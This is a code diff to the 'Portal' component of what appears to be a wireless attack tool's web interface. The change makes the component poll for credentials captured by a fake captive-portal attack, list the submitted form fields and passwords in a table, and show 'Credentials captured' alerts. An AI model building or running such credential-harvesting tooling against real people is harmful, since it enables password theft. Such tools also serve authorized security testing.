@@ -25,23 +25,40 @@ export function Portal() {
   const [portalSelected, setPortalSelected] = useState(false);
   const [passwords, setPasswords] = useState([]);
 
+  // The send-only WS can be LRU-purged during the browser's HTTP polls, so the
+  // device-cached REST list is the source of truth; the WS handler is just for
+  // an instant toast.
+  useEffect(() => {
+    let alive = true;
+    async function poll() {
+      try {
+        const res = await api.portalCaptures();
+        if (!alive || !res || !res.ok) return;
+        const list = (res.captures || []).map((c, i) => {
+          const fields = parseFormFields(c.data);
+          return {
+            id: `${c.at}-${i}`,
+            fields,
+            summary: fields.map((f) => `${f.key}=${f.value}`).join('  ') || c.data,
+          };
+        }).reverse();
+        setPasswords(list);
+      } catch (_) { /* ignore */ }
+    }
+    poll();
+    const t = setInterval(poll, 2000);
+    return () => { alive = false; clearInterval(t); };
+  }, []);
+
   useEffect(() => wsAddListener((msg) => {
     if (msg.type === 'attack_started' && msg.attack === 'portal') setRunning(true);
     if (msg.type === 'attack_stopped') setRunning(false);
     if (msg.type === 'portal_data') {
       const fields = parseFormFields(msg.data);
       const summary = fields.map((f) => `${f.key}=${f.value}`).join('  ');
-      setPasswords((prev) => [
-        { id: `${Date.now()}-${Math.random().toString(16).slice(2, 6)}`, fields, summary, time: new Date().toLocaleTimeString() },
-        ...prev,
-      ]);
       showToast(`Credentials captured: ${summary}`, 'success');
     }
     if (msg.type === 'password_received') {
-      setPasswords((prev) => [
-        { id: `${Date.now()}-${Math.random().toString(16).slice(2, 6)}`, fields: [{ key: 'password', value: msg.password }], summary: msg.password, time: new Date().toLocaleTimeString() },
-        ...prev,
-      ]);
       showToast(`Password captured: ${msg.password}`, 'success');
     }
   }), []);
@@ -118,11 +135,11 @@ export function Portal() {
           </div>
           <div class="table-wrap">
             <table class="table">
-              <thead><tr><th>Time</th><th>Submitted data</th></tr></thead>
+              <thead><tr><th>#</th><th>Submitted data</th></tr></thead>
               <tbody>
-                {passwords.map((pw) => (
+                {passwords.map((pw, i) => (
                   <tr key={pw.id}>
-                    <td>{pw.time}</td>
+                    <td>{passwords.length - i}</td>
                     <td>
                       {(pw.fields && pw.fields.length) ? pw.fields.map((f) => (
                         <div key={f.key}><span class="kv-key">{f.key}:</span> {f.value}</div>
